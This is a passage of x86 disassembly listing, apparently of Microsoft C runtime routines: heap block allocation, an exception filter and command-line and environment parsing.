  40542b:	0f 85 80 00 00 00    	jne    0x4054b1
  405431:	8b 75 fc             	mov    -0x4(%ebp),%esi
  405434:	c1 fe 04             	sar    $0x4,%esi
  405437:	4e                   	dec    %esi
  405438:	83 fe 3f             	cmp    $0x3f,%esi
  40543b:	76 03                	jbe    0x405440
  40543d:	6a 3f                	push   $0x3f
  40543f:	5e                   	pop    %esi
  405440:	8b 4f 04             	mov    0x4(%edi),%ecx
  405443:	3b 4f 08             	cmp    0x8(%edi),%ecx
  405446:	75 42                	jne    0x40548a
  405448:	83 fe 20             	cmp    $0x20,%esi
  40544b:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  405450:	73 19                	jae    0x40546b
  405452:	8b ce                	mov    %esi,%ecx
  405454:	d3 eb                	shr    %cl,%ebx
  405456:	8d 74 06 04          	lea    0x4(%esi,%eax,1),%esi
  40545a:	f7 d3                	not    %ebx
  40545c:	21 5c 90 44          	and    %ebx,0x44(%eax,%edx,4)
  405460:	fe 0e                	decb   (%esi)
  405462:	75 23                	jne    0x405487
  405464:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405467:	21 19                	and    %ebx,(%ecx)
  405469:	eb 1c                	jmp    0x405487
  40546b:	8d 4e e0             	lea    -0x20(%esi),%ecx
  40546e:	d3 eb                	shr    %cl,%ebx
  405470:	8d 4c 06 04          	lea    0x4(%esi,%eax,1),%ecx
  405474:	f7 d3                	not    %ebx
  405476:	21 9c 90 c4 00 00 00 	and    %ebx,0xc4(%eax,%edx,4)
  40547d:	fe 09                	decb   (%ecx)
  40547f:	75 06                	jne    0x405487
  405481:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405484:	21 59 04             	and    %ebx,0x4(%ecx)
  405487:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40548a:	8b 4f 08             	mov    0x8(%edi),%ecx
  40548d:	8b 77 04             	mov    0x4(%edi),%esi
  405490:	89 71 04             	mov    %esi,0x4(%ecx)
  405493:	8b 77 08             	mov    0x8(%edi),%esi
  405496:	8b 4f 04             	mov    0x4(%edi),%ecx
  405499:	89 71 08             	mov    %esi,0x8(%ecx)
  40549c:	8b 75 10             	mov    0x10(%ebp),%esi
  40549f:	03 75 fc             	add    -0x4(%ebp),%esi
  4054a2:	89 75 10             	mov    %esi,0x10(%ebp)
  4054a5:	c1 fe 04             	sar    $0x4,%esi
  4054a8:	4e                   	dec    %esi
  4054a9:	83 fe 3f             	cmp    $0x3f,%esi
  4054ac:	76 03                	jbe    0x4054b1
  4054ae:	6a 3f                	push   $0x3f
  4054b0:	5e                   	pop    %esi
  4054b1:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4054b4:	8d 0c f1             	lea    (%ecx,%esi,8),%ecx
  4054b7:	8b 79 04             	mov    0x4(%ecx),%edi
  4054ba:	89 4b 08             	mov    %ecx,0x8(%ebx)
  4054bd:	89 7b 04             	mov    %edi,0x4(%ebx)
  4054c0:	89 59 04             	mov    %ebx,0x4(%ecx)
  4054c3:	8b 4b 04             	mov    0x4(%ebx),%ecx
  4054c6:	89 59 08             	mov    %ebx,0x8(%ecx)
  4054c9:	8b 4b 04             	mov    0x4(%ebx),%ecx
  4054cc:	3b 4b 08             	cmp    0x8(%ebx),%ecx
  4054cf:	75 57                	jne    0x405528
  4054d1:	8a 4c 06 04          	mov    0x4(%esi,%eax,1),%cl
  4054d5:	88 4d 0f             	mov    %cl,0xf(%ebp)
  4054d8:	fe c1                	inc    %cl
  4054da:	83 fe 20             	cmp    $0x20,%esi
  4054dd:	88 4c 06 04          	mov    %cl,0x4(%esi,%eax,1)
  4054e1:	73 1c                	jae    0x4054ff
  4054e3:	80 7d 0f 00          	cmpb   $0x0,0xf(%ebp)
  4054e7:	75 0e                	jne    0x4054f7
  4054e9:	8b ce                	mov    %esi,%ecx
  4054eb:	bf 00 00 00 80       	mov    $0x80000000,%edi
  4054f0:	d3 ef                	shr    %cl,%edi
  4054f2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4054f5:	09 39                	or     %edi,(%ecx)
  4054f7:	8d 44 90 44          	lea    0x44(%eax,%edx,4),%eax
  4054fb:	8b ce                	mov    %esi,%ecx
  4054fd:	eb 20                	jmp    0x40551f
  4054ff:	80 7d 0f 00          	cmpb   $0x0,0xf(%ebp)
  405503:	75 10                	jne    0x405515
  405505:	8d 4e e0             	lea    -0x20(%esi),%ecx
  405508:	bf 00 00 00 80       	mov    $0x80000000,%edi
  40550d:	d3 ef                	shr    %cl,%edi
  40550f:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405512:	09 79 04             	or     %edi,0x4(%ecx)
  405515:	8d 84 90 c4 00 00 00 	lea    0xc4(%eax,%edx,4),%eax
  40551c:	8d 4e e0             	lea    -0x20(%esi),%ecx
  40551f:	ba 00 00 00 80       	mov    $0x80000000,%edx
  405524:	d3 ea                	shr    %cl,%edx
  405526:	09 10                	or     %edx,(%eax)
  405528:	8b 45 10             	mov    0x10(%ebp),%eax
  40552b:	89 03                	mov    %eax,(%ebx)
  40552d:	89 44 18 fc          	mov    %eax,-0x4(%eax,%ebx,1)
  405531:	33 c0                	xor    %eax,%eax
  405533:	40                   	inc    %eax
  405534:	5f                   	pop    %edi
  405535:	5e                   	pop    %esi
  405536:	5b                   	pop    %ebx
  405537:	c9                   	leave
  405538:	c3                   	ret
  405539:	55                   	push   %ebp
  40553a:	8b ec                	mov    %esp,%ebp
  40553c:	83 ec 14             	sub    $0x14,%esp
  40553f:	a1 e0 d8 40 00       	mov    0x40d8e0,%eax
  405544:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405547:	6b c0 14             	imul   $0x14,%eax,%eax
  40554a:	03 05 e4 d8 40 00    	add    0x40d8e4,%eax
  405550:	83 c1 17             	add    $0x17,%ecx
  405553:	83 e1 f0             	and    $0xfffffff0,%ecx
  405556:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  405559:	c1 f9 04             	sar    $0x4,%ecx
  40555c:	53                   	push   %ebx
  40555d:	49                   	dec    %ecx
  40555e:	83 f9 20             	cmp    $0x20,%ecx
  405561:	56                   	push   %esi
  405562:	57                   	push   %edi
  405563:	7d 0b                	jge    0x405570
  405565:	83 ce ff             	or     $0xffffffff,%esi
  405568:	d3 ee                	shr    %cl,%esi
  40556a:	83 4d f8 ff          	orl    $0xffffffff,-0x8(%ebp)
  40556e:	eb 0d                	jmp    0x40557d
  405570:	83 c1 e0             	add    $0xffffffe0,%ecx
  405573:	83 ca ff             	or     $0xffffffff,%edx
  405576:	33 f6                	xor    %esi,%esi
  405578:	d3 ea                	shr    %cl,%edx
  40557a:	89 55 f8             	mov    %edx,-0x8(%ebp)
  40557d:	8b 0d ec d8 40 00    	mov    0x40d8ec,%ecx
  405583:	8b d9                	mov    %ecx,%ebx
  405585:	eb 11                	jmp    0x405598
  405587:	8b 53 04             	mov    0x4(%ebx),%edx
  40558a:	8b 3b                	mov    (%ebx),%edi
  40558c:	23 55 f8             	and    -0x8(%ebp),%edx
  40558f:	23 fe                	and    %esi,%edi
  405591:	0b d7                	or     %edi,%edx
  405593:	75 0a                	jne    0x40559f
  405595:	83 c3 14             	add    $0x14,%ebx
  405598:	3b d8                	cmp    %eax,%ebx
  40559a:	89 5d 08             	mov    %ebx,0x8(%ebp)
  40559d:	72 e8                	jb     0x405587
  40559f:	3b d8                	cmp    %eax,%ebx
  4055a1:	75 7f                	jne    0x405622
  4055a3:	8b 1d e4 d8 40 00    	mov    0x40d8e4,%ebx
  4055a9:	eb 11                	jmp    0x4055bc
  4055ab:	8b 53 04             	mov    0x4(%ebx),%edx
  4055ae:	8b 3b                	mov    (%ebx),%edi
  4055b0:	23 55 f8             	and    -0x8(%ebp),%edx
  4055b3:	23 fe                	and    %esi,%edi
  4055b5:	0b d7                	or     %edi,%edx
  4055b7:	75 0a                	jne    0x4055c3
  4055b9:	83 c3 14             	add    $0x14,%ebx
  4055bc:	3b d9                	cmp    %ecx,%ebx
  4055be:	89 5d 08             	mov    %ebx,0x8(%ebp)
  4055c1:	72 e8                	jb     0x4055ab
  4055c3:	3b d9                	cmp    %ecx,%ebx
  4055c5:	75 5b                	jne    0x405622
  4055c7:	eb 0c                	jmp    0x4055d5
  4055c9:	83 7b 08 00          	cmpl   $0x0,0x8(%ebx)
  4055cd:	75 0a                	jne    0x4055d9
  4055cf:	83 c3 14             	add    $0x14,%ebx
  4055d2:	89 5d 08             	mov    %ebx,0x8(%ebp)
  4055d5:	3b d8                	cmp    %eax,%ebx
  4055d7:	72 f0                	jb     0x4055c9
  4055d9:	3b d8                	cmp    %eax,%ebx
  4055db:	75 31                	jne    0x40560e
  4055dd:	8b 1d e4 d8 40 00    	mov    0x40d8e4,%ebx
  4055e3:	eb 09                	jmp    0x4055ee
  4055e5:	83 7b 08 00          	cmpl   $0x0,0x8(%ebx)
  4055e9:	75 0a                	jne    0x4055f5
  4055eb:	83 c3 14             	add    $0x14,%ebx
  4055ee:	3b d9                	cmp    %ecx,%ebx
  4055f0:	89 5d 08             	mov    %ebx,0x8(%ebp)
  4055f3:	72 f0                	jb     0x4055e5
  4055f5:	3b d9                	cmp    %ecx,%ebx
  4055f7:	75 15                	jne    0x40560e
  4055f9:	e8 a6 fa ff ff       	call   0x4050a4
  4055fe:	8b d8                	mov    %eax,%ebx
  405600:	85 db                	test   %ebx,%ebx
  405602:	89 5d 08             	mov    %ebx,0x8(%ebp)
  405605:	75 07                	jne    0x40560e
  405607:	33 c0                	xor    %eax,%eax
  405609:	e9 09 02 00 00       	jmp    0x405817
  40560e:	53                   	push   %ebx
  40560f:	e8 40 fb ff ff       	call   0x405154
  405614:	59                   	pop    %ecx
  405615:	8b 4b 10             	mov    0x10(%ebx),%ecx
  405618:	89 01                	mov    %eax,(%ecx)
  40561a:	8b 43 10             	mov    0x10(%ebx),%eax
  40561d:	83 38 ff             	cmpl   $0xffffffff,(%eax)
  405620:	74 e5                	je     0x405607
  405622:	89 1d ec d8 40 00    	mov    %ebx,0x40d8ec
  405628:	8b 43 10             	mov    0x10(%ebx),%eax
  40562b:	8b 10                	mov    (%eax),%edx
  40562d:	83 fa ff             	cmp    $0xffffffff,%edx
  405630:	89 55 fc             	mov    %edx,-0x4(%ebp)
  405633:	74 14                	je     0x405649
  405635:	8b 8c 90 c4 00 00 00 	mov    0xc4(%eax,%edx,4),%ecx
  40563c:	8b 7c 90 44          	mov    0x44(%eax,%edx,4),%edi
  405640:	23 4d f8             	and    -0x8(%ebp),%ecx
  405643:	23 fe                	and    %esi,%edi
  405645:	0b cf                	or     %edi,%ecx
  405647:	75 29                	jne    0x405672
  405649:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40564d:	8b 90 c4 00 00 00    	mov    0xc4(%eax),%edx
  405653:	8d 48 44             	lea    0x44(%eax),%ecx
  405656:	8b 39                	mov    (%ecx),%edi
  405658:	23 55 f8             	and    -0x8(%ebp),%edx
  40565b:	23 fe                	and    %esi,%edi
  40565d:	0b d7                	or     %edi,%edx
  40565f:	75 0e                	jne    0x40566f
  405661:	ff 45 fc             	incl   -0x4(%ebp)
  405664:	8b 91 84 00 00 00    	mov    0x84(%ecx),%edx
  40566a:	83 c1 04             	add    $0x4,%ecx
  40566d:	eb e7                	jmp    0x405656
  40566f:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405672:	8b ca                	mov    %edx,%ecx
  405674:	69 c9 04 02 00 00    	imul   $0x204,%ecx,%ecx
  40567a:	8d 8c 01 44 01 00 00 	lea    0x144(%ecx,%eax,1),%ecx
  405681:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  405684:	8b 4c 90 44          	mov    0x44(%eax,%edx,4),%ecx
  405688:	33 ff                	xor    %edi,%edi
  40568a:	23 ce                	and    %esi,%ecx
  40568c:	75 12                	jne    0x4056a0
  40568e:	8b 8c 90 c4 00 00 00 	mov    0xc4(%eax,%edx,4),%ecx
  405695:	23 4d f8             	and    -0x8(%ebp),%ecx
  405698:	6a 20                	push   $0x20
  40569a:	5f                   	pop    %edi
  40569b:	eb 03                	jmp    0x4056a0
  40569d:	03 c9                	add    %ecx,%ecx
  40569f:	47                   	inc    %edi
  4056a0:	85 c9                	test   %ecx,%ecx
  4056a2:	7d f9                	jge    0x40569d
  4056a4:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4056a7:	8b 54 f9 04          	mov    0x4(%ecx,%edi,8),%edx
  4056ab:	8b 0a                	mov    (%edx),%ecx
  4056ad:	2b 4d f0             	sub    -0x10(%ebp),%ecx
  4056b0:	8b f1                	mov    %ecx,%esi
  4056b2:	c1 fe 04             	sar    $0x4,%esi
  4056b5:	4e                   	dec    %esi
  4056b6:	83 fe 3f             	cmp    $0x3f,%esi
  4056b9:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4056bc:	7e 03                	jle    0x4056c1
  4056be:	6a 3f                	push   $0x3f
  4056c0:	5e                   	pop    %esi
  4056c1:	3b f7                	cmp    %edi,%esi
  4056c3:	0f 84 01 01 00 00    	je     0x4057ca
  4056c9:	8b 4a 04             	mov    0x4(%edx),%ecx
  4056cc:	3b 4a 08             	cmp    0x8(%edx),%ecx
  4056cf:	75 5c                	jne    0x40572d
  4056d1:	83 ff 20             	cmp    $0x20,%edi
  4056d4:	bb 00 00 00 80       	mov    $0x80000000,%ebx
  4056d9:	7d 26                	jge    0x405701
  4056db:	8b cf                	mov    %edi,%ecx
  4056dd:	d3 eb                	shr    %cl,%ebx
  4056df:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4056e2:	8d 7c 38 04          	lea    0x4(%eax,%edi,1),%edi
  4056e6:	f7 d3                	not    %ebx
  4056e8:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  4056eb:	23 5c 88 44          	and    0x44(%eax,%ecx,4),%ebx
  4056ef:	89 5c 88 44          	mov    %ebx,0x44(%eax,%ecx,4)
  4056f3:	fe 0f                	decb   (%edi)
  4056f5:	75 33                	jne    0x40572a
  4056f7:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4056fa:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4056fd:	21 0b                	and    %ecx,(%ebx)
  4056ff:	eb 2c                	jmp    0x40572d
  405701:	8d 4f e0             	lea    -0x20(%edi),%ecx
  405704:	d3 eb                	shr    %cl,%ebx
  405706:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405709:	8d 8c 88 c4 00 00 00 	lea    0xc4(%eax,%ecx,4),%ecx
  405710:	8d 7c 38 04          	lea    0x4(%eax,%edi,1),%edi
  405714:	f7 d3                	not    %ebx
  405716:	21 19                	and    %ebx,(%ecx)
  405718:	fe 0f                	decb   (%edi)
  40571a:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  40571d:	75 0b                	jne    0x40572a
  40571f:	8b 5d 08             	mov    0x8(%ebp),%ebx
  405722:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  405725:	21 4b 04             	and    %ecx,0x4(%ebx)
  405728:	eb 03                	jmp    0x40572d
  40572a:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40572d:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  405731:	8b 4a 08             	mov    0x8(%edx),%ecx
  405734:	8b 7a 04             	mov    0x4(%edx),%edi
  405737:	89 79 04             	mov    %edi,0x4(%ecx)
  40573a:	8b 4a 04             	mov    0x4(%edx),%ecx
  40573d:	8b 7a 08             	mov    0x8(%edx),%edi
  405740:	89 79 08             	mov    %edi,0x8(%ecx)
  405743:	0f 84 8d 00 00 00    	je     0x4057d6
  405749:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40574c:	8d 0c f1             	lea    (%ecx,%esi,8),%ecx
  40574f:	8b 79 04             	mov    0x4(%ecx),%edi
  405752:	89 4a 08             	mov    %ecx,0x8(%edx)
  405755:	89 7a 04             	mov    %edi,0x4(%edx)
  405758:	89 51 04             	mov    %edx,0x4(%ecx)
  40575b:	8b 4a 04             	mov    0x4(%edx),%ecx
  40575e:	89 51 08             	mov    %edx,0x8(%ecx)
  405761:	8b 4a 04             	mov    0x4(%edx),%ecx
  405764:	3b 4a 08             	cmp    0x8(%edx),%ecx
  405767:	75 5e                	jne    0x4057c7
  405769:	8a 4c 06 04          	mov    0x4(%esi,%eax,1),%cl
  40576d:	88 4d 0b             	mov    %cl,0xb(%ebp)
  405770:	fe c1                	inc    %cl
  405772:	83 fe 20             	cmp    $0x20,%esi
  405775:	88 4c 06 04          	mov    %cl,0x4(%esi,%eax,1)
  405779:	7d 23                	jge    0x40579e
  40577b:	80 7d 0b 00          	cmpb   $0x0,0xb(%ebp)
  40577f:	75 0b                	jne    0x40578c
  405781:	bf 00 00 00 80       	mov    $0x80000000,%edi
  405786:	8b ce                	mov    %esi,%ecx
  405788:	d3 ef                	shr    %cl,%edi
  40578a:	09 3b                	or     %edi,(%ebx)
  40578c:	8b ce                	mov    %esi,%ecx
  40578e:	bf 00 00 00 80       	mov    $0x80000000,%edi
  405793:	d3 ef                	shr    %cl,%edi
  405795:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405798:	09 7c 88 44          	or     %edi,0x44(%eax,%ecx,4)
  40579c:	eb 29                	jmp    0x4057c7
  40579e:	80 7d 0b 00          	cmpb   $0x0,0xb(%ebp)
  4057a2:	75 0d                	jne    0x4057b1
  4057a4:	8d 4e e0             	lea    -0x20(%esi),%ecx
  4057a7:	bf 00 00 00 80       	mov    $0x80000000,%edi
  4057ac:	d3 ef                	shr    %cl,%edi
  4057ae:	09 7b 04             	or     %edi,0x4(%ebx)
  4057b1:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4057b4:	8d bc 88 c4 00 00 00 	lea    0xc4(%eax,%ecx,4),%edi
  4057bb:	8d 4e e0             	lea    -0x20(%esi),%ecx
  4057be:	be 00 00 00 80       	mov    $0x80000000,%esi
  4057c3:	d3 ee                	shr    %cl,%esi
  4057c5:	09 37                	or     %esi,(%edi)
  4057c7:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4057ca:	85 c9                	test   %ecx,%ecx
  4057cc:	74 0b                	je     0x4057d9
  4057ce:	89 0a                	mov    %ecx,(%edx)
  4057d0:	89 4c 11 fc          	mov    %ecx,-0x4(%ecx,%edx,1)
  4057d4:	eb 03                	jmp    0x4057d9
  4057d6:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4057d9:	8b 75 f0             	mov    -0x10(%ebp),%esi
  4057dc:	03 d1                	add    %ecx,%edx
  4057de:	8d 4e 01             	lea    0x1(%esi),%ecx
  4057e1:	89 0a                	mov    %ecx,(%edx)
  4057e3:	89 4c 32 fc          	mov    %ecx,-0x4(%edx,%esi,1)
  4057e7:	8b 75 f4             	mov    -0xc(%ebp),%esi
  4057ea:	8b 0e                	mov    (%esi),%ecx
  4057ec:	85 c9                	test   %ecx,%ecx
  4057ee:	8d 79 01             	lea    0x1(%ecx),%edi
  4057f1:	89 3e                	mov    %edi,(%esi)
  4057f3:	75 1a                	jne    0x40580f
  4057f5:	3b 1d 98 d5 40 00    	cmp    0x40d598,%ebx
  4057fb:	75 12                	jne    0x40580f
  4057fd:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405800:	3b 0d f4 d8 40 00    	cmp    0x40d8f4,%ecx
  405806:	75 07                	jne    0x40580f
  405808:	83 25 98 d5 40 00 00 	andl   $0x0,0x40d598
  40580f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405812:	89 08                	mov    %ecx,(%eax)
  405814:	8d 42 04             	lea    0x4(%edx),%eax
  405817:	5f                   	pop    %edi
  405818:	5e                   	pop    %esi
  405819:	5b                   	pop    %ebx
  40581a:	c9                   	leave
  40581b:	c3                   	ret
  40581c:	8b 44 24 04          	mov    0x4(%esp),%eax
  405820:	8b 00                	mov    (%eax),%eax
  405822:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  405828:	75 2a                	jne    0x405854
  40582a:	83 78 10 03          	cmpl   $0x3,0x10(%eax)
  40582e:	75 24                	jne    0x405854
  405830:	8b 40 14             	mov    0x14(%eax),%eax
  405833:	3d 20 05 93 19       	cmp    $0x19930520,%eax
  405838:	74 15                	je     0x40584f
  40583a:	3d 21 05 93 19       	cmp    $0x19930521,%eax
  40583f:	74 0e                	je     0x40584f
  405841:	3d 22 05 93 19       	cmp    $0x19930522,%eax
  405846:	74 07                	je     0x40584f
  405848:	3d 00 40 99 01       	cmp    $0x1994000,%eax
  40584d:	75 05                	jne    0x405854
  40584f:	e8 c7 ee ff ff       	call   0x40471b
  405854:	33 c0                	xor    %eax,%eax
  405856:	c2 04 00             	ret    $0x4
  405859:	68 1c 58 40 00       	push   $0x40581c
  40585e:	ff 15 0c 90 40 00    	call   *0x40900c
  405864:	33 c0                	xor    %eax,%eax
  405866:	c3                   	ret
  405867:	56                   	push   %esi
  405868:	57                   	push   %edi
  405869:	33 ff                	xor    %edi,%edi
  40586b:	39 3d 18 d9 40 00    	cmp    %edi,0x40d918
  405871:	75 05                	jne    0x405878
  405873:	e8 5e e5 ff ff       	call   0x403dd6
  405878:	8b 35 08 d9 40 00    	mov    0x40d908,%esi
  40587e:	85 f6                	test   %esi,%esi
  405880:	75 05                	jne    0x405887
  405882:	be 82 95 40 00       	mov    $0x409582,%esi
  405887:	8a 06                	mov    (%esi),%al
  405889:	3c 20                	cmp    $0x20,%al
  40588b:	77 08                	ja     0x405895
  40588d:	84 c0                	test   %al,%al
  40588f:	74 2e                	je     0x4058bf
  405891:	85 ff                	test   %edi,%edi
  405893:	74 24                	je     0x4058b9
  405895:	3c 22                	cmp    $0x22,%al
  405897:	75 09                	jne    0x4058a2
  405899:	33 c9                	xor    %ecx,%ecx
  40589b:	85 ff                	test   %edi,%edi
  40589d:	0f 94 c1             	sete   %cl
  4058a0:	8b f9                	mov    %ecx,%edi
  4058a2:	0f b6 c0             	movzbl %al,%eax
  4058a5:	50                   	push   %eax
  4058a6:	e8 0b 1f 00 00       	call   0x4077b6
  4058ab:	85 c0                	test   %eax,%eax
  4058ad:	59                   	pop    %ecx
  4058ae:	74 01                	je     0x4058b1
  4058b0:	46                   	inc    %esi
  4058b1:	46                   	inc    %esi
  4058b2:	eb d3                	jmp    0x405887
  4058b4:	3c 20                	cmp    $0x20,%al
  4058b6:	77 07                	ja     0x4058bf
  4058b8:	46                   	inc    %esi
  4058b9:	8a 06                	mov    (%esi),%al
  4058bb:	84 c0                	test   %al,%al
  4058bd:	75 f5                	jne    0x4058b4
  4058bf:	5f                   	pop    %edi
  4058c0:	8b c6                	mov    %esi,%eax
  4058c2:	5e                   	pop    %esi
  4058c3:	c3                   	ret
  4058c4:	53                   	push   %ebx
  4058c5:	33 db                	xor    %ebx,%ebx
  4058c7:	39 1d 18 d9 40 00    	cmp    %ebx,0x40d918
  4058cd:	56                   	push   %esi
  4058ce:	57                   	push   %edi
  4058cf:	75 05                	jne    0x4058d6
  4058d1:	e8 00 e5 ff ff       	call   0x403dd6
  4058d6:	8b 35 a0 d0 40 00    	mov    0x40d0a0,%esi
  4058dc:	33 ff                	xor    %edi,%edi
  4058de:	3b f3                	cmp    %ebx,%esi
  4058e0:	75 18                	jne    0x4058fa
  4058e2:	83 c8 ff             	or     $0xffffffff,%eax
  4058e5:	e9 9b 00 00 00       	jmp    0x405985
  4058ea:	3c 3d                	cmp    $0x3d,%al
  4058ec:	74 01                	je     0x4058ef
  4058ee:	47                   	inc    %edi
  4058ef:	56                   	push   %esi
  4058f0:	e8 1b 0c 00 00       	call   0x406510
  4058f5:	59                   	pop    %ecx
  4058f6:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
  4058fa:	8a 06                	mov    (%esi),%al
  4058fc:	3a c3                	cmp    %bl,%al
  4058fe:	75 ea                	jne    0x4058ea
  405900:	6a 04                	push   $0x4
  405902:	47                   	inc    %edi
  405903:	57                   	push   %edi
  405904:	e8 7d e8 ff ff       	call   0x404186
  405909:	8b f8                	mov    %eax,%edi
  40590b:	3b fb                	cmp    %ebx,%edi
  40590d:	59                   	pop    %ecx
  40590e:	59                   	pop    %ecx
  40590f:	89 3d 7c d0 40 00    	mov    %edi,0x40d07c
  405915:	74 cb                	je     0x4058e2
  405917:	8b 35 a0 d0 40 00    	mov    0x40d0a0,%esi
  40591d:	55                   	push   %ebp
  40591e:	eb 40                	jmp    0x405960
  405920:	56                   	push   %esi
  405921:	e8 ea 0b 00 00       	call   0x406510
  405926:	8b e8                	mov    %eax,%ebp
  405928:	45                   	inc    %ebp
  405929:	80 3e 3d             	cmpb   $0x3d,(%esi)
  40592c:	59                   	pop    %ecx
  40592d:	74 2f                	je     0x40595e
  40592f:	6a 01                	push   $0x1
  405931:	55                   	push   %ebp
  405932:	e8 4f e8 ff ff       	call   0x404186
  405937:	3b c3                	cmp    %ebx,%eax
  405939:	59                   	pop    %ecx
  40593a:	59                   	pop    %ecx
  40593b:	89 07                	mov    %eax,(%edi)
  40593d:	74 4a                	je     0x405989
  40593f:	56                   	push   %esi
  405940:	55                   	push   %ebp
  405941:	50                   	push   %eax
  405942:	e8 62 0b 00 00       	call   0x4064a9
  405947:	83 c4 0c             	add    $0xc,%esp
  40594a:	85 c0                	test   %eax,%eax
  40594c:	74 0d                	je     0x40595b
  40594e:	53                   	push   %ebx
  40594f:	53                   	push   %ebx
  405950:	53                   	push   %ebx
  405951:	53                   	push   %ebx
  405952:	53                   	push   %ebx
  405953:	e8 b2 b7 ff ff       	call   0x40110a
  405958:	83 c4 14             	add    $0x14,%esp
  40595b:	83 c7 04             	add    $0x4,%edi
  40595e:	03 f5                	add    %ebp,%esi
  405960:	38 1e                	cmp    %bl,(%esi)
  405962:	75 bc                	jne    0x405920
  405964:	ff 35 a0 d0 40 00    	push   0x40d0a0
  40596a:	e8 20 d3 ff ff       	call   0x402c8f
  40596f:	89 1d a0 d0 40 00    	mov    %ebx,0x40d0a0
  405975:	89 1f                	mov    %ebx,(%edi)
  405977:	c7 05 0c d9 40 00 01 	movl   $0x1,0x40d90c
  40597e:	00 00 00 
  405981:	33 c0                	xor    %eax,%eax
  405983:	59                   	pop    %ecx
  405984:	5d                   	pop    %ebp
  405985:	5f                   	pop    %edi
  405986:	5e                   	pop    %esi
  405987:	5b                   	pop    %ebx
  405988:	c3                   	ret
  405989:	ff 35 7c d0 40 00    	push   0x40d07c
  40598f:	e8 fb d2 ff ff       	call   0x402c8f
  405994:	89 1d 7c d0 40 00    	mov    %ebx,0x40d07c
  40599a:	83 c8 ff             	or     $0xffffffff,%eax
  40599d:	eb e4                	jmp    0x405983
  40599f:	55                   	push   %ebp
  4059a0:	8b ec                	mov    %esp,%ebp
  4059a2:	51                   	push   %ecx
  4059a3:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4059a6:	53                   	push   %ebx
  4059a7:	33 c0                	xor    %eax,%eax
  4059a9:	39 45 08             	cmp    %eax,0x8(%ebp)
  4059ac:	56                   	push   %esi
  4059ad:	89 07                	mov    %eax,(%edi)
  4059af:	8b f2                	mov    %edx,%esi
  4059b1:	8b 55 0c             	mov    0xc(%ebp),%edx
  4059b4:	c7 01 01 00 00 00    	movl   $0x1,(%ecx)
  4059ba:	74 09                	je     0x4059c5
  4059bc:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4059bf:	83 45 08 04          	addl   $0x4,0x8(%ebp)
  4059c3:	89 13                	mov    %edx,(%ebx)
  4059c5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4059c8:	80 3e 22             	cmpb   $0x22,(%esi)
  4059cb:	75 10                	jne    0x4059dd
  4059cd:	33 c0                	xor    %eax,%eax
  4059cf:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  4059d2:	b3 22                	mov    $0x22,%bl
  4059d4:	0f 94 c0             	sete   %al
  4059d7:	46                   	inc    %esi
  4059d8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4059db:	eb 3c                	jmp    0x405a19
  4059dd:	ff 07                	incl   (%edi)
  4059df:	85 d2                	test   %edx,%edx
  4059e1:	74 08                	je     0x4059eb
  4059e3:	8a 06                	mov    (%esi),%al
  4059e5:	88 02                	mov    %al,(%edx)
  4059e7:	42                   	inc    %edx
  4059e8:	89 55 0c             	mov    %edx,0xc(%ebp)
  4059eb:	8a 1e                	mov    (%esi),%bl
  4059ed:	0f b6 c3             	movzbl %bl,%eax
  4059f0:	50                   	push   %eax
  4059f1:	46                   	inc    %esi
  4059f2:	e8 bf 1d 00 00       	call   0x4077b6
  4059f7:	85 c0                	test   %eax,%eax
  4059f9:	59                   	pop    %ecx
  4059fa:	74 13                	je     0x405a0f
  4059fc:	ff 07                	incl   (%edi)
  4059fe:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  405a02:	74 0a                	je     0x405a0e
  405a04:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  405a07:	8a 06                	mov    (%esi),%al
  405a09:	ff 45 0c             	incl   0xc(%ebp)
  405a0c:	88 01                	mov    %al,(%ecx)
  405a0e:	46                   	inc    %esi
  405a0f:	84 db                	test   %bl,%bl
  405a11:	8b 55 0c             	mov    0xc(%ebp),%edx
  405a14:	8b 4d 10             	mov    0x10(%ebp),%ecx
  405a17:	74 32                	je     0x405a4b
  405a19:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  405a1d:	75 a9                	jne    0x4059c8
  405a1f:	80 fb 20             	cmp    $0x20,%bl
  405a22:	74 05                	je     0x405a29
  405a24:	80 fb 09             	cmp    $0x9,%bl
  405a27:	75 9f                	jne    0x4059c8
  405a29:	85 d2                	test   %edx,%edx
  405a2b:	74 04                	je     0x405a31
  405a2d:	c6 42 ff 00          	movb   $0x0,-0x1(%edx)
  405a31:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
